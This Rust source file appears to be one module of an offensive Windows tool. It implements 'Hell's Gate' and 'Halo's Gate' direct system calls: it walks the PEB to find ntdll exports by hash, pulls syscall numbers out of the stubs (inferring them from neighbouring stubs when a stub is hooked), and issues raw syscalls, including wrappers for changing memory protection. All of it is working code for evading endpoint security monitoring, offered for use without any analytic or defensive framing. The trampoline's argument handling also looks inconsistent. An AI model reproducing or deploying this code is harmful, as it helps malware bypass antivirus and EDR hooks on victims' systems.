// syscall.rs — Hell's Gate + Halo's Gate direct syscall engine
//
// Hell's Gate:  read SSN from `mov eax, <ssn>` (4C 8B D1 B8 XX 00 00 00) in ntdll stub
// Halo's Gate:  if stub is hooked (starts with E9 jmp), walk neighboring stubs ±1..±32
//               to find unhooked neighbor, infer SSN by offset
// Trampoline:   naked fn sets rcx/rdx/r8/r9/stack args, loads SSN into eax, syscall

#![allow(non_snake_case, dead_code)]

use core::{arch::{asm, naked_asm}, ffi::c_void, ptr::null_mut};
use crate::defs::*;
use crate::utils::djb2;

// ─── PEB export walk ─────────────────────────────────────────────────────────

pub unsafe fn get_proc_from_peb(module_hash: u32, export_hash: u32) -> Option<*const u8> {
    let peb: usize;
    asm!("mov {}, qword ptr gs:[0x60]", out(reg) peb, options(nostack, readonly));
    if peb == 0 { return None; }

    let ldr        = *((peb + 0x18) as *const usize) as *const u8;
    let list_head  = ldr.add(0x10) as *const usize;
    let mut flink  = *list_head as *const u8;

    loop {
        let base      = *(flink.add(0x30) as *const *const u8);
        let name_us   = flink.add(0x58) as *const UNICODE_STRING;
        let name_buf  = (*name_us).Buffer;
        let name_len  = (*name_us).Length as usize / 2;

        if !base.is_null() && name_len > 0 {
            let mut mh: u32 = 5381;
            for i in 0..name_len {
                let c = (*name_buf.add(i)) as u8;
                let lc = if c >= b'A' && c <= b'Z' { c + 32 } else { c };
                mh = mh.wrapping_mul(33).wrapping_add(lc as u32);
            }

            if mh == module_hash {
                if (base as *const u16).read_unaligned() != IMAGE_DOS_SIGNATURE { return None; }
                let e_lfanew  = (base.add(0x3C) as *const u32).read_unaligned() as usize;
                let opt_base  = e_lfanew + 4 + 20;
                let exp_rva   = (base.add(opt_base + 112) as *const u32).read_unaligned() as usize;
                let exp_dir   = base.add(exp_rva);
                let n_names   = (exp_dir.add(0x18) as *const u32).read_unaligned() as usize;
                let names_rva = (exp_dir.add(0x20) as *const u32).read_unaligned() as usize;
                let ords_rva  = (exp_dir.add(0x24) as *const u32).read_unaligned() as usize;
                let funcs_rva = (exp_dir.add(0x1C) as *const u32).read_unaligned() as usize;

                for i in 0..n_names {
                    let name_rva = (base.add(names_rva + i*4) as *const u32).read_unaligned() as usize;
                    let name_ptr = base.add(name_rva);
                    let mut eh: u32 = 5381;
                    let mut j = 0usize;
                    loop {
                        let b = *name_ptr.add(j);
                        if b == 0 { break; }
                        eh = eh.wrapping_mul(33).wrapping_add(b as u32);
                        j += 1;
                    }
                    if eh == export_hash {
                        let ord      = (base.add(ords_rva + i*2) as *const u16).read_unaligned() as usize;
                        let fn_rva   = (base.add(funcs_rva + ord*4) as *const u32).read_unaligned() as usize;
                        return Some(base.add(fn_rva));
                    }
                }
            }
        }

        let next = *(flink as *const usize);
        if next == *list_head { break; }
        flink = next as *const u8;
    }
    None
}

// ─── SSN extraction ───────────────────────────────────────────────────────────

pub unsafe fn extract_ssn(stub: *const u8) -> Option<u16> {
    if *stub.add(0) == 0x4C && *stub.add(1) == 0x8B && *stub.add(2) == 0xD1
       && *stub.add(3) == 0xB8 {
        let lo = *stub.add(4) as u16;
        let hi = *stub.add(5) as u16;
        return Some(lo | (hi << 8));
    }
    if *stub == 0xE9 {
        for delta in 1u16..=32 {
            for sign in [1i32, -1i32] {
                let offset   = (delta as usize) * 32;
                let neighbor = if sign > 0 { stub.add(offset) } else { stub.sub(offset) };
                if *neighbor.add(0) == 0x4C && *neighbor.add(1) == 0x8B
                   && *neighbor.add(2) == 0xD1 && *neighbor.add(3) == 0xB8 {
                    let base_ssn = (*neighbor.add(4) as u16) | ((*neighbor.add(5) as u16) << 8);
                    let ssn = if sign > 0 { base_ssn.wrapping_sub(delta) } else { base_ssn.wrapping_add(delta) };
                    return Some(ssn);
                }
            }
        }
    }
    None
}

pub unsafe fn resolve_ssn(name: &str) -> Option<u16> {
    let ntdll_h  = djb2(b"ntdll.dll");
    let mut hash = 5381u32;
    for b in name.bytes() { hash = hash.wrapping_mul(33).wrapping_add(b as u32); }
    let stub = get_proc_from_peb(ntdll_h, hash)?;
    extract_ssn(stub)
}

// ─── Syscall trampoline ───────────────────────────────────────────────────────

#[unsafe(naked)]
pub unsafe extern "system" fn syscall_trampoline(
    ssn: u32,
    a1: usize, a2: usize, a3: usize, a4: usize,
) -> NTSTATUS {
    naked_asm!(
        "mov r10, rcx",
        "mov eax, ecx",
        "mov rcx, rdx",
        "mov rdx, r8",
        "mov r8,  r9",
        "mov r9,  [rsp+0x28]",
        "mov r10, rcx",
        "syscall",
        "ret",
    )
}

// ─── Convenience wrapper ──────────────────────────────────────────────────────

pub unsafe fn do_syscall(ssn: u16, a1: usize, a2: usize, a3: usize, a4: usize,
                          a5: usize, a6: usize) -> NTSTATUS {
    let result: i32;
    asm!(
        "sub rsp, 0x50",
        "mov [rsp+0x28], {a5}",
        "mov [rsp+0x30], {a6}",
        "mov r10, {a1}",
        "mov rdx, {a2}",
        "mov r8,  {a3}",
        "mov r9,  {a4}",
        "mov eax, {ssn:e}",
        "syscall",
        "add rsp, 0x50",
        ssn = in(reg) ssn as u32,
        a1  = in(reg) a1,
        a2  = in(reg) a2,
        a3  = in(reg) a3,
        a4  = in(reg) a4,
        a5  = in(reg) a5,
        a6  = in(reg) a6,
        lateout("eax") result,
        options(nostack)
    );
    result
}

// ─── Typed wrappers ───────────────────────────────────────────────────────────

pub unsafe fn nt_protect_virtual_memory(
    process: HANDLE,
    base:    *mut PVOID,
    size:    *mut SIZE_T,
    new:     u32,
    old:     *mut u32,
) -> Result<(), NTSTATUS> {
    let ssn = resolve_ssn("NtProtectVirtualMemory").unwrap_or(0);
    let st  = do_syscall(ssn,
        process as usize, base as usize, size as usize,
        new as usize, old as usize, 0);
    if NT_SUCCESS(st) { Ok(()) } else { Err(st) }
}

pub unsafe fn nt_flush_instruction_cache(
    process: HANDLE,
    base:    PVOID,
    size:    SIZE_T,
) -> Result<(), NTSTATUS> {
    let ssn = resolve_ssn("NtFlushInstructionCache").unwrap_or(0);
    let st  = do_syscall(ssn, process as usize, base as usize, size, 0, 0, 0);
    if NT_SUCCESS(st) { Ok(()) } else { Err(st) }
}
